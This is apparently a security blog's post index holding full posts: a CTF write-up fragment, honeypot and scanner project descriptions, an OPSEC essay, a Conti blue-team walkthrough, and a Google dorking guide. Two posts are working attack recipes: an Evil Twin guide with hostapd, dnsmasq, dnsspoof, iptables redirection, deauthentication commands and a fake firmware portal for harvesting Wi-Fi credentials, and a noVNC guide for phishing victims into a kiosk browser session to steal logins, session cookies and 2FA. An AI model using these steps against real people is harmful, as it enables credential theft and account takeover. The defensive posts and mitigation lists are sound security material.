as Root:ssh -i /tmp/id_rsa root@lookup.thmRetrieving Root Flag:cat /root/root.txt{REDACTED}"
  },
  
  {
    "title": "Honeypot Suite",
    "url": "/posts/python-honeypot-suite",
    "categories": "Python, Honeypot Suite",
    "tags": "Python, Honeypot Suite",
    "date": "2025-02-09 00:00:00 +0000",
    





    
    "snippet": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup,...",
    "content": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup, maintenance, and contribution.Honeypot Suite Repository  Link: Honeypot Suite RepositoryDirectory StructureThe repository follows a modular structure for clarity and extensibility:honeypot-suite/├── https_honeypot.py       # HTTPS honeypot implementation├── dns_honeypot.py         # DNS honeypot implementation├── ssh_honeypot.py         # SSH honeypot implementation├── ftp_honeypot.py         # FTP honeypot implementation├── postgresql_honeypot.py  # PostgreSQL honeypot implementation├── menu.py                 # Centralized GUI for managing honeypots└──  README.md               # Project documentationFeaturesThe honeypot suite is designed to simulate various network services, allowing you to monitor and analyze malicious activities. Key features include:  Multi-Protocol Support: Supports HTTPS, DNS, SSH, FTP, and PostgreSQL protocols.  Dynamic Configuration: Allows users to configure host, port, and protocol-specific settings via a GUI or command-line interface.  Real-Time Logging: Logs all interactions with the honeypot in real-time, providing detailed insights into attacker behavior.  Customizable Responses: Each honeypot can be configured to respond with custom data (e.g., fake IP addresses for DNS, dummy responses for SSH).  Self-Signed Certificates: Automatically generates SSL/TLS certificates for HTTPS and SSH honeypots.  Cross-Platform Compatibility: Works on Windows, macOS, and Linux.How It WorksThe honeypot suite operates by mimicking vulnerable network services to attract attackers and log their interactions. Here’s an overview of how it works:  Service Simulation:          Each honeypot module simulates a specific protocol (e.g., DNS, SSH) and listens for incoming connections.      The honeypot responds to queries or login attempts with predefined or dynamically generated data.        Logging:          All interactions are logged to files (e.g., dns_honeypot.log, ssh_honeypot.log) for later analysis.      Logs include details such as source IP, port, query type, username/password attempts, and more.        GUI Management:          A professional GUI (menu.py) allows users to select, configure, and manage honeypots easily.      Start/stop buttons ensure seamless control over each service.        Termination:          Closing the Python program stops the honeypot service.      Ensure proper termination using tips provided below.      Code StructureThe honeypot suite is modular and extensible, with each protocol implemented as a separate Python script. Below is the high-level structure:  Honeypot Modules:          Each protocol has its own script (e.g., https_honeypot.py, dns_honeypot.py).      Scripts expose start_honeypot and stop_honeypot functions for integration.        Centralized Control:          The menu.py script provides a unified interface for managing all honeypots.      Dynamically loads modules based on user selection.        Twisted Framework:          Built using Twisted, a powerful event-driven networking engine for Python.      Ensures efficient handling of network traffic and logging.        Cryptography Library:          Uses the cryptography library to generate self-signed certificates for HTTPS and SSH.      InterfaceMenuThe menu.py script provides a clean and intuitive GUI for selecting and configuring honeypots:Steps to Use the Menu:  Select a protocol (e.g., DNS, SSH).  Configure settings such as host, port, and additional parameters (e.g., SSH version).  Click “Start Honeypot” to begin monitoring.  View logs in real-time within the GUI.LimitationsWhile the honeypot suite is robust, it has some limitations:  Resource Consumption: Running multiple honeypots simultaneously may consume significant system resources.  False Positives: Legitimate users interacting with the honeypot may generate logs that need filtering.  Single Process Reactor: Only one Twisted reactor can run at a time, limiting simultaneous honeypot execution without subprocesses.  Basic Simulations: The honeypots provide basic simulations and may not fully replicate complex production environments.Future EnhancementsPlanned enhancements include:  Advanced Logging: Integrate with centralized logging systems like Elasticsearch or Splunk for better analysis.  Machine Learning: Use ML models to detect and classify attack patterns automatically.  Containerization: Package each honeypot in Docker containers for easier deployment and isolation.  Web-Based Interface: Replace the Tkinter GUI with a web-based dashboard for remote management.  Automated Alerts: Send email or SMS alerts when suspicious activity is detected.Ethical ConsiderationsUsing honeypots for cybersecurity research must adhere to ethical guidelines:  Authorization: Deploy honeypots only in environments where you have explicit permission.  Data Privacy: Avoid logging sensitive information from legitimate users.  Legal Compliance: Ensure compliance with local laws and regulations regarding data collection and monitoring.  Isolation: Run honeypots in isolated networks to prevent unintended exposure.Tips and TricksEnsuring Proper TerminationTo ensure the honeypot stops cleanly:  Graceful Shutdown:          Press Ctrl+C in the terminal running the honeypot.      Verify termination using tools like netstat or tasklist.        Example:    netstat -ano | findstr :&lt;port&gt;taskkill /PID &lt;PID&gt; /F        Check Logs:          Review the log file (e.g., dns_honeypot.log) to confirm the honeypot stopped successfully.      Setting Up the HTTPS Honeypot  Download Resources:          Specify a target URL (e.g., https://example.com) to download and serve content.      The honeypot inlines CSS, JavaScript, and images to reduce external dependencies.        Generate Certificates:          Customize SSL certificate details (e.g., country, organization) during startup.      Certificates are stored locally in the script directory.        Run the Honeypot:          Execute the script with desired configurations:        python https_honeypot.py --host 0.0.0.0 --port 443 --url https://example.com                      Test Locally:          Use tools like curl or Postman to test the honeypot:        curl -k https://127.0.0.1/                    Extra InsightsWhy Use Honeypots?Honeypots are invaluable tools for:  Gathering intelligence on attacker techniques and tools.  Detecting and mitigating threats in real-time.  Educating teams about security risks through practical demonstrations.Best Practices  Regular Updates: Keep the honeypot scripts updated to handle new attack vectors.  Controlled Environment: Deploy honeypots in sandboxed or virtualized environments to minimize risks.  Analyze Logs: Regularly review logs to identify trends and improve your security posture.Example OutputBelow is an example log entry from the DNS honeypot:[2023-10-15 12:34:56] DNS Query Received - Query Name: example.com, Type: A, Class: IN, From: ('192.168.1.100', 5353)From the SSH honeypot:[2023-10-15 12:35:00] Login attempt - Username: admin, Password: password123ConclusionThis honeypot suite is a tool for cybersecurity researchers. By simulating vulnerable services, it helps you understand attacker behavior and strengthen your defenses. While the current implementation focuses on simplicity and usability, future enhancements will expand its capabilities and make it even more effective."
  },
  
  {
    "title": "Network Scanner",
    "url": "/posts/python-network-scanner",
    "categories": "Python, Network Scanner",
    "tags": "Python, Network Scanner",
    "date": "2025-02-07 00:00:00 +0000",
    





    
    "snippet": "Python-based tool designed for network reconnaissance, service detection, and vulnerability analysis. It supports port scanning, service fingerprinting, web analysis, geolocation, and detailed repo...",
    "content": "Python-based tool designed for network reconnaissance, service detection, and vulnerability analysis. It supports port scanning, service fingerprinting, web analysis, geolocation, and detailed reporting in both HTML and JSON formats.Network Scanner Repository  Link: Network Scanner RepositoryFeaturesThe Network Scanner is a powerful Python-based tool designed for network reconnaissance, service detection, and vulnerability analysis. Key features include:  Port Scanning: Identify open ports and running services on both IPv4 and IPv6 addresses.  Service Detection: Detect services like HTTP, SSH, FTP, and more using banners, extended probes, and SSL/TLS analysis.  Web Analysis: Analyze websites for technologies, security headers, WAF detection, and potential vulnerabilities.  Geolocation: Pinpoint the physical location of IP addresses using the GeoLite2 database.  DNS Information: Retrieve DNS records (A, MX, TXT) and perform reverse DNS lookups.  WHOIS Lookup: Fetch domain registration details.  Reporting: Generate professional HTML and JSON reports with risk assessments.  Customizable: Configure timeouts, concurrent scans, and reporting formats via config.yml.  Cross-Platform: Works seamlessly on Windows, Linux, and macOS.How It WorksThe Network Scanner operates in several stages:  Target Resolution:          Resolves hostnames to both IPv4 and IPv6 addresses.      Performs reverse DNS lookups and geolocation for resolved IPs.        Port Scanning:          Scans default or custom ports using asynchronous techniques for efficiency.      Supports retries, timeouts, and rate limiting to ensure reliability.        Service Detection:          Identifies services running on open ports using banners, SSL/TLS information, and extended probes.      Analyzes web services for technologies, security headers, and vulnerabilities.        Reporting:          Generates detailed HTML and JSON reports with scan results, risk assessments, and metadata.        User Interaction:          Provides an interactive menu for selecting scan modes, entering targets, and specifying custom ports.      Code StructureThe project is organized into modular components for maintainability and scalability:  network_scanner.py: Main entry point for the application. Handles user interaction and orchestrates the scanning process.  utils/async_scanner.py: Implements asynchronous port scanning and service detection.  utils/web_analyzer.py: Analyzes websites for technologies, vulnerabilities, and security headers.  utils/reporter.py: Generates HTML and JSON reports based on scan results.  utils/config_manager.py: Manages configuration loading and validation from config.yml.  utils/logger.py: Handles logging to both console and file outputs.  templates/: Contains HTML and CSS templates for report generation.  GeoLite2-City.mmdb: GeoIP database for geolocation features.  config.yml: Configuration file for scanner settings.InterfaceFuture EnhancementsThe following features are planned for future releases:  Enhanced Vulnerability Scanning: Integrate with CVE databases for real-time vulnerability checks.  Authentication Support: Add support for scanning authenticated endpoints.  Graphical User Interface (GUI): Develop a GUI for easier interaction.  API Integration: Provide an API for integrating the scanner into other tools or workflows.  Improved Reporting: Add PDF export and customizable report templates.  Support for Additional Protocols: Extend support for protocols like SNMP, SIP, and more.Ethical ConsiderationsThe Network Scanner is intended for ethical use only. Users must adhere to the following guidelines:  Authorization: Always obtain explicit permission before scanning networks or systems.  Legal Compliance: Ensure compliance with local laws and regulations regarding network scanning.  Responsible Use: Avoid using the tool for malicious purposes or unauthorized activities.  Data Privacy: Handle any data collected during scans responsibly and securely.By using this tool, you agree to abide by these ethical considerations and assume full responsibility for its usage."
  },
  
  {
    "title": "OPSEC",
    "url": "/posts/opsec/",
    "categories": "OPSEC, Anonymity",
    "tags": "Anonymity, Privacy",
    "date": "2025-02-04 11:53:00 +0000",
    





    
    "snippet": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OP...",
    "content": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OPSEC, or OPERATIONS SECURITY. For those who fancy a formal definition, OPSEC is the art of evaluating whether our moves are visible to potential threats, assessing the risk of compromising information, and then taking calculated measures to thwart those who seek to exploit our critical data.The Origins of OPSECDiving into the tactical realm, OPSEC emerged officially in 1966 during the US’s Operation Purple Dragon, spurred by the need to investigate operational mishaps and devise a pre-operation process to dodge fatal compromises.Core PrinciplesIn a nutshell, OPSEC boils down to one thing: control. Control over information and actions, to prevent any attempts at turning them against you. Whether you’re immersed in threat intelligence collection, a red team engagement, or just nosing around an investigation, OPSEC is the guardian angel watching over it all. While the textbooks swear by five sacred steps, we’re zooming in on a couple, starting with the core of Identifying and Analyzing Threats &amp; Vulnerabilities.Picture a process that unveils the adversary’s watchful gaze, details the information they crave, and pinpoints your Achilles’ heels. That’s just the kickoff. We then pivot to Assessing Risks and strategically applying Appropriate Countermeasures. Quick heads-up: I’m spinning this yarn with a big ol’ focus on Anonymity and Privacy.Safeguarding Critical InformationNow, whether you’re a soldier, a civilian, or somewhere in the murky in-between, safeguarding your critical information is non-negotiable. This isn’t just a 9-to-5 deal—it extends to your home. OPSEC isn’t just for the field; it’s your shield against personal info leaks and safeguarding sensitive details from turning into weapons against you. From PII and financial data to your daily grind, address, and personal records, OPSEC’s got your back.Stick around, and we’ll navigate the cyber, hopping between topics, unraveling my train of thought. By the time we wrap this up, it should all click into place.Identifying and Analyzing Threats &amp; VulnerabilitiesAlright, let’s demystify the Identification of Critical Information. In plain speak, it’s about pinpointing what needs safeguarding to pull off the operation without a hitch. Be it your source IP address, the tools of the trade, or the intricate web of your command and control (C&amp;C) infrastructure – make it crystal clear. Enter CALI (Capabilities, Activities, Limitations, and Intentions), a straightforward checklist outlining the operation’s must-haves. But before I dive into the deep end and potentially befuddle you, let’s ease into it with a high-level overview and a dash of shenanigans.Internet Privacy: IP AddressLet’s get down to the internet. IP – the gateway to the online realm. Your connection to the internet is marked by an IP provided by your trusty ISP (Internet Service Provider), a key linked to an entry in their database. Most countries, ever-vigilant, have data retention regulations, forcing ISPs to log who’s using what IP when, for years on end. If that origin IP leaks, it’s a breadcrumb trail straight to you.DNS (Domain Name System)Now, DNS. Standing for “Domain Name System,” it’s the wizard behind the curtain, helping your browser find the IP address of a service. Think of it as a colossal contact list – ask for a name, and it hands you the number. When your browser wants to visit, say, github via github.com, it ping-pongs with a DNS service to unveil the IP addresses of github’s servers.Typically, your ISP dishes out the DNS service, automatically set up by the network you’re on. So, you type github.com into your browser, and the request embarks on an internet journey, hopping from DNS resolver to root nameserver to TLD server, and finally, to the domain’s nameserver. All this dance reveals the IP address of github.com, which then travels back to your browser, completing the ritual.For a deeper dive, check out: What is DNS?But here’s the kicker – most of these DNS requests cruise unencrypted. Even if you’re surfing in incognito mode or HTTPS, your browser might be casually throwing unencrypted DNS requests out there, saying, “Hey, what’s the IP address of www.cloudflare.com”. Not exactly covert, right?Fortifying Your Privacy with Encrypted DNSNow that we’ve paved the way and you’ve got the basics down, let’s talk about fortifying your privacy. Enter encrypted DNS (DNS over HTTPS or DNS over TLS). You can set up your private DNS server, self-hosted with something like pi-hole or remotely hosted with services like nextdns or 1.1.1.1 within the Tor network. Sounds like airtight privacy, right? Well, not entirely.You can’t don the cloak of Tor all the time – it’s like shouting, “Hey, look at me!” and that’s not our game plan. To dodge unnecessary attention, we introduce VPNs and Tor, tag-teaming to keep your ISP and any nosy third party from eavesdropping or blocking your DNS requests. We’ll unpack this intricate dance in more detail down the road.MAC Address Randomization &amp; TrackingWe’ve got a glaring gap to address here – MAC addresses, a pivotal piece of the puzzle. Your MAC address, acting as a unique ID for your network interface, can become a tracking beacon if left unrandomized. Big players like Microsoft and Apple, along with device manufacturers, maintain logs with MAC addresses, creating a traceable trail linking devices to specific accounts.Even if you think you’ve slipped under the radar by buying your gadget “anonymously,” surveillance tactics, from CCTV footage to mobile provider antenna logs, might expose your identity. So, randomizing your MAC becomes a non-negotiable move. Concealing both your MAC and Bluetooth addresses is paramount.Threat Analysis: Understanding Your AdversaryNow, let’s unpack Threat Analysis in layman’s terms. It’s all about getting to know your adversaries inside out and identifying what’s on the line. Picture this: the threat of your source IP, network, or fingerprint being exposed. This becomes especially critical when dealing with malware samples – slip up, and your investigation might be blown.For those donning the hat of adversary hunters, safeguarding your identity as a researcher is paramount. Some adversaries aren’t above trying to infect or exploit researchers with malware. Let’s break it down step by step:  Main OS: Used for normal work, research, browsing, and keeping things clean.  Private VM: For malware analysis, encrypted traffic routing.  Hidden OS: A VM within a VM, routed through Tor for complete anonymity.This multi-layered approach significantly slashes the odds of your adversaries easily de-anonymizing you.Whonix: A Linchpin for AnonymizationEnter Whonix, a linchpin in the anonymization process. Whonix, a Linux distribution, rolls out two Virtual Machines:  Whonix Workstation: Your go-to for anonymous activities.  Whonix Gateway: Establishing a connection to the Tor network and routing all network traffic from the Workstation through the Tor network.You’ve got two routes here:  Whonix-only route, where all traffic journeys through the Tor Network.  Whonix hybrid route, where everything goes through a cash-paid VPN over the Tor Network.Choose your adventure wisely.Vulnerability Analysis &amp; Risk AssessmentNow, let’s delve into identifying vulnerabilities – the weak spots adversaries are itching to exploit. The Tor Project, while a formidable force, isn’t an impervious fortress against global adversaries. Successful attacks have left their mark, and advanced techniques boasting a remarkable 96% success rate in fingerprinting encrypted traffic have emerged over the years, exposing the websites you’ve visited.Consider major platforms like Twitter and Facebook. The anonymity offered by Tor starts losing its mojo when users toss in their real names, pictures, and link their accounts to personal info like emails and phone numbers. Platforms can employ algorithms to scrutinize browsing patterns, potentially connecting you to other profiles.Securing DevicesDon’t forget to disable Bluetooth, biometrics, webcam, and microphone. Enable BIOS/UEFI password, and disable USB/HDMI. These measures help keep things in check and fend off certain attacks. And whatever you do, don’t leave your laptop unattended in your hotel room or elsewhere. Make it as challenging as possible for anyone to tamper with it without raising alarms.Conclusion: OPSEC as a StrategyI won’t sugarcoat it – achieving perfect OPSEC is an illusion. Compromises are inevitable. The key is in your dedication and the measures you’re willing to take. The more time invested and the more cautious you are, the better.Remember the basics: avoid attracting attention, stay vigilant, be patient, steer clear of laziness and ignorance, blend in, do what makes sense, and, most importantly, Sh*t up.Final ThoughtsI’ve touched on the shenanigans in play. While not an exhaustive dive into every facet of attacks or vulnerabilities, consider this a 101 to kickstart your research. It’s designed to stake a claim in the recesses of your mind, offering a glimpse into how an OPSEC strategy should take shape.And no matter what research you conduct or guide/tips you come across might not cut it; they could be downright irrelevant to your unique operations.So, how do you make this realistically work? Simple. Build your own OPSEC and execute drills that fit your OP. It shouldn’t consume more than a few hours in most cases. Stay sharp, stay secure."
  },
  
  {
    "title": "THM: Conti",
    "url": "/posts/ctf-blueteam-conti",
    "categories": "CTF, Blue Team",
    "tags": "CTF, Blue Team",
    "date": "2025-02-02 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Splunk  VirusTotal  SysmonResources Used:  Conti: TryHackMe  Sysmon Event Logs  Splunk Queries  CVE ResearchSteps for the CTFOverviewSome...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Splunk  VirusTotal  SysmonResources Used:  Conti: TryHackMe  Sysmon Event Logs  Splunk Queries  CVE ResearchSteps for the CTFOverviewSome employees from your company reported that they can’t log into Outlook. The Exchange system admin also reported that he can’t log in to the Exchange Admin Center. After initial triage, they discovered some weird ReadMe.txt files settled on the Exchange server.Question 1: Can you identify the location of the ransomware?Search for Sysmon event code 11 (file creation events) in Splunk. Filter for logs related to the creation of ReadMe.txt files and examine the Image field to locate suspicious executables. Look for unusual directories, such as C:\\Users\\Administrator\\Documents, to identify the ransomware’s location.Question 2: What is the Sysmon event ID for the related file creation event?The Sysmon event ID associated with file creation events is 11. This event was used to track the creation of the ReadMe.txt files.Question 3: Can you find the MD5 hash of the ransomware?Search Splunk for logs containing the suspicious executable identified in Question 1. Include the MD5 string in your query to filter for logs that include the hash of the executable. Once located, analyze the hash using a tool like VirusTotal to confirm its malicious nature.Question 4: What file was saved to multiple folder locations?Search for Sysmon event code 11 (file creation events) in Splunk. Focus on the TargetFileName field to identify files created in multiple locations. Look for patterns or repeated filenames across different directories to determine the file in question.Question 5: What was the command the attacker used to add a new user to the compromised system?Search Splunk for instances of the net user command, which is commonly used to create new users. Examine the CommandLine field to locate the exact command executed by the attacker, including any suspicious usernames or passwords.Question 6: The attacker migrated the process for better persistence. What is the migrated process image (executable), and what is the original process image (executable) when the attacker got on the system?Search for Sysmon event code 8 (CreateRemoteThread events) in Splunk. Examine the SourceImage and TargetImage fields to identify the original and migrated processes. Look for evidence of a suspicious process injecting into a legitimate system process for persistence.Question 7: The attacker also retrieved the system hashes. What is the process image used for getting the system hashes?Analyze the logs for evidence of process migration or suspicious activity involving authentication-related processes. Research common Windows processes involved in handling system hashes (e.g., lsass.exe) and identify the process image in the logs that aligns with this behavior.Question 8: What is the web shell the exploit deployed to the system?Search Splunk for logs containing .aspx extensions, which are commonly associated with web shells. Examine the cs_uri_stem field to locate suspicious files requested over HTTP/HTTPS. Identify the file that matches the characteristics of a web shell.Question 9: What is the command line that executed this web shell?Search Splunk for logs containing the name of the web shell identified in Question 8. Examine the CommandLine field to locate the exact command used to execute the web shell, including any additional parameters or flags.Question 10: What three CVEs did this exploit leverage?Research known vulnerabilities associated with the Conti ransomware. Look for credible sources that list the specific CVEs exploited by Conti and identify the three most relevant CVEs based on the context of the challenge."
  },
  
  {
    "title": "Evil Twin Attack",
    "url": "/posts/Evil-Twin-Attack/",
    "categories": "Exploits, Evil Twin Attack",
    "tags": "Exploits, Evil Twin Attack",
    "date": "2025-02-01 13:40:00 +0000",
    





    
    "snippet": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) th...",
    "content": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) that mimics a legitimate one. The goal is to force clients to disconnect from the legitimate network and reconnect to the malicious AP, which has the same SSID. Once connected, the attacker can intercept traffic, redirect users to a fake firmware upgrade page, and harvest credentials or other sensitive information.This attack can be executed using a Debian-based OS like Kali Linux without the need for additional hardware (though an external NIC may improve performance). Below is a step-by-step guide to setting up the attack, followed by mitigation strategies to defend against such exploits.Attack Overview  Objective:          Knock Wi-Fi clients off their legitimate network.      Force them to reconnect to a rogue AP with the same SSID.      Redirect traffic to a fake firmware upgrade portal to harvest credentials.        Tools:          hostapd: For creating the rogue AP.      dnsmasq: For DHCP and DNS spoofing.      apache2/nginx: For hosting the fake portal.      iptables: For traffic redirection.      aireplay-ng: For deauthentication attacks.        Prerequisites:          A wireless interface in monitor mode.      Basic knowledge of networking, social engineering, and web development.      Step-by-Step Execution1. Install Required Toolssudo apt install hostapd dnsmasq apache22. Set Wireless Interface to Monitor Modeiwconfig [iface] mode monitor3. Create Working Directorymkdir evil-twin &amp;&amp; cd evil-twin4. Configure hostapdCreate hostapd.conf:vim hostapd.confConfiguration:interface = [iface]driver = nl80211ssid = [ESSID of target]hw_mode = gchannel = [channel of target]macaddr_acl = 0ignore_broadcast_ssid = 05. Configure dnsmasqCreate dnsmasq.conf:vim dnsmasq.confConfiguration:interface = [iface]dhcp-range = 192.168.1.2, 192.168.1.30, 255.255.255.0, 12hdhcp-option=3, 192.168.1.1dhcp-option=6, 192.168.1.1server = 8.8.8.8log-querieslog-dhcplisten-address=127.0.0.16. Configure Network Interfaceifconfig [iface] up 192.168.1.1 netmask 255.255.255.07. Add Routing Rulesroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.18. Set Up IP Tables for Traffic Redirectioniptables --table nat --append PREROUTING -i [iface] -p tcp -j REDIRECT --to-ports &lt;ports running your portal&gt;9. Set Up the Fake Portal  Use tools like httrack to clone a legitimate firmware upgrade page.  Modify the HTML/CSS to make it convincing.  Set up a backend (e.g., Flask, Node.js) to handle user input.  Save credentials to a database or file.10. Start Serviceshostapd hostapd.confdnsmasq -C dnsmasq.conf -ddnsspoof -i [iface]11. Launch Deauthentication Attackaireplay-ng --deauth 0 -a [victim's BSSID] [iface]Mitigation Strategies1. Use Strong Encryption  Ensure your Wi-Fi network uses WPA3 encryption. If WPA3 is unavailable, use WPA2 with a strong passphrase.2. Monitor for Rogue APs  Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue APs.3. Implement Certificate-Based Authentication  Use 802.1X/EAP to authenticate devices connecting to your network. This prevents unauthorized devices from joining, even if they have the correct SSID and password.4. Educate Users  Train users to recognize suspicious activity, such as unexpected firmware upgrade prompts or certificate warnings.5. Disable Auto-Reconnect  Configure devices to not auto-reconnect to known networks without user confirmation.6. Regularly Update Firmware  Ensure all network devices are running the latest firmware to patch known vulnerabilities.7. Segment Your Network  Use VLANs to isolate sensitive devices and services from the rest of the network.8. Monitor Network Traffic  Use tools like Wireshark or Zeek to analyze network traffic for anomalies.9. Enable HTTPS Everywhere  Ensure all web-based services use HTTPS to prevent traffic interception.10. Deploy Honeypots  Set up honeypot APs to detect and analyze malicious activity."
  },
  
  {
    "title": "Server-Side Request Forgery (SSRF)",
    "url": "/posts/bug-bounty/ssrf",
    "categories": "Bug Bounty, Vulnerabilities",
    "tags": "Bug Bounty, SSRF, Vulnerabilities",
    "date": "2025-01-30 00:00:00 +0000",
    





    
    "snippet": "Coming-Soon",
    "content": "Coming-Soon"
  },
  
  {
    "title": "Exploiting noVNC for 2FA Bypass",
    "url": "/posts/Exploiting-noVNC-for-2FA-Bypass/",
    "categories": "Exploits, noVNC",
    "tags": "Exploits, noVNC, 2FA Bypass",
    "date": "2025-01-29 00:00:00 +0000",
    





    
    "snippet": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, inclu...",
    "content": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, including mobile versions for iOS and Android, noVNC allows the web browser to function as a VNC client, enabling remote access to a machine.So, how can we use noVNC to acquire credentials and bypass 2FA? Here’s the process:  Set up a server with noVNC.  Start Chromium (or any other browser) in Kiosk mode.  Direct it to the desired website for user authentication (e.g., accounts.google.com).  Send the link to the target user. When they click the URL, they will access the VNC session without realizing it.  Since Chromium is configured in Kiosk mode, the user experience will appear as a normal web page.Exploitation PossibilitiesThe exploitation possibilities of this method are vast:  Inject JS into the browser.  Use an HTTP proxy connected to the browser to log all activities.  Terminate the VNC session after user authentication.  Capture the browser session token (Right-click &gt; Inspect &gt; Application &gt; Cookies) after the user disconnects.  Run a background keylogger.  Or get creative and find other approaches (remember, the server is yours).noVNC Setup and Demonstration1. Deploy a Kali Linux InstanceUse any cloud service provider or deploy locally to set up a Linux machine. I will use Kali Linux for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.2. Install TigerVNCFirst, you need to install VNC software. I tested two options: X11vnc and TigerVNC. After several tests, I chose to use TigerVNC.sudo apt updatesudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer3. Set Up a VNC PasswordvncpasswdOn Kali Linux, I didn’t need to create the xstartup file, but if you encounter any errors, you can configure it manually.nano ~/.vnc/xstartupPaste or write the following:#!/bin/shxrdb \"$HOME/.Xresources\"xsetroot -solid greyx-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/XsessionAdd execution permissions:chmod +x ~/.vnc/xstartup4. Restart the VNC ServerRestart the VNC server, choosing the screen size settings according to your needs. noVNC automatically adjusts to the browser’s screen size, but do your own testing.vncserver -depth 32 -geometry 1920x10805. Download and Run noVNCgit clone https://github.com/novnc/noVNC.gitORapt install novncNow run noVNC locally or publicly. Here are the commands:  Check the VNC server port:vncserver -listExample: 5901, 5902, 5903, etc.  Run noVNC:./noVNC/utils/novnc_proxy --vnc localhost:5901  Set up an SSH tunnel:ssh -L 6080:127.0.0.1:6080 root@server  Run publicly using port 8081:ufw allow http./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 80816. Access VNC and Run the Browser in Kiosk ModeAccess your VNC and run the browser in Kiosk mode. I used Chromium, but you can use whatever suits your needs.chromium --no-sandbox --app=https://gmail.com --kiosk7. Send the URL to the “Victim” to Connect Automaticallyhttp://127.0.0.1:6080/vnc.html?autoconnect=true&amp;password=YOUR-PASSWORDThe autoconnect=true&amp;password=VNCPASSWORD will make the user authenticate automatically. If you want to rename the query parameter, you can modify the vnc.html file.8. Modify the CSS to Remove Visual ElementsnoVNC displays a custom loading page, a VNC control bar, and some additional unnecessary visual elements that should be removed.Open vnc.html, find the divs below, and add the CSS style shown.&lt;!-- Hide unnecessary items --&gt;&lt;div id=\"noVNC_control_bar_anchor\" class=\"noVNC_vcenter\" style=\"display:none;\"&gt;&lt;div id=\"noVNC_status\" style=\"display:none\"&gt;&lt;/div&gt;&lt;!-- Makes the loading page white --&gt;&lt;div id=\"noVNC_transition\" style=\"background-color:white;color:white\"&gt;Important Notes  You are giving remote access to your machine! It should not have anything valuable stored on it.  Any logged data should likely be sent to a remote machine.  Do not use the root account. Set up a restricted user account that uses the VNC service.  Configure the Kiosk mode more restrictively."
  },
  
  {
    "title": "Mastering Google Dorking: The Ultimate Guide",
    "url": "/master-google-dorking-ultimate-guide",
    "categories": "OSINT, Google Dorking",
    "tags": "Google Dorking, Advanced Search",
    "date": "2025-01-28 00:00:00 +0000",
    





    
    "snippet": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything ...",
    "content": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything from the basics to advanced techniques, including automation, OSINT gathering, vulnerability exploitation, and ethical considerations. Whether you’re a beginner or an experienced cybersecurity professional, this guide will help you master Google Dorking.Table of Contents  Introduction to Google Dorking  Fundamentals of Google Dorking  Understanding Google Dork Operators  Common Google Dork Queries  Advanced Techniques          Advanced Query Crafting      Exploiting Specific Vulnerabilities      Using Google Dorking for OSINT      Automation and Scripting        Case Studies  Preventing Google Dorking  Google Dorking Tools and Resources  Legal Considerations  ConclusionIntroduction to Google DorkingGoogle Dorking is a technique used to find sensitive information accidentally exposed on the internet. This can include:  Log files with usernames and passwords  Exposed cameras and IoT devices  Sensitive documents (e.g., financial records, confidential files)  Website vulnerabilities (e.g., SQL injection points)While Google Dorking is a powerful tool for information gathering, it is often misused for malicious purposes such as cyberattacks, identity theft, and digital espionage. This guide emphasizes ethical use and encourages readers to use these techniques for security testing and vulnerability assessment.Fundamentals of Google DorkingGoogle Dorking relies on advanced search operators to refine search results. These operators allow you to target specific types of information. Below are the seven fundamental types of queries used in Google Dorking:  intitle: Searches for pages with specific text in their HTML title.          Example: intitle:\"login page\"        allintitle: Similar to intitle, but requires all keywords to be in the title.          Example: allintitle:\"login page admin\"        inurl: Searches for pages based on text in the URL.          Example: inurl:login.php        allinurl: Similar to inurl, but requires all keywords to be in the URL.          Example: allinurl:admin login        filetype: Filters results by specific file types.          Example: filetype:pdf        ext: Filters results by file extensions.          Example: ext:log        site: Limits search results to a specific website.          Example: site:example.com      Understanding Google Dork OperatorsGoogle Dork operators are the building blocks of effective queries. Here’s a breakdown of the most commonly used operators:            Operator      Description      Example                  intitle      Searches for pages with specific text in the title.      intitle:\"login page\"              allintitle      Searches for pages with all specified keywords in the title.      allintitle:\"admin login\"              inurl      Searches for pages with specific text in the URL.      inurl:admin              allinurl      Searches for pages with all specified keywords in the URL.      allinurl:admin login              filetype      Filters results by specific file types.      filetype:pdf              ext      Filters results by file extensions.      ext:log              intext      Searches for pages containing specific text in the body.      intext:\"username\"              allintext      Searches for pages containing all specified keywords in the body.      allintext:\"username password\"              site      Limits search results to a specific domain.      site:example.com              cache      Displays the cached version of a page.      cache:example.com      Common Google Dork QueriesBelow are some commonly used Google Dork queries for various purposes:General Dorksintitle:\"Index of\"intitle:\"Index of\" site:example.comfiletype:log inurl:\"access.log\"intext:\"Welcome to phpMyAdmin\"intitle:\"Login — WordPress\"intext:\"Powered by WordPress\"Database-Related 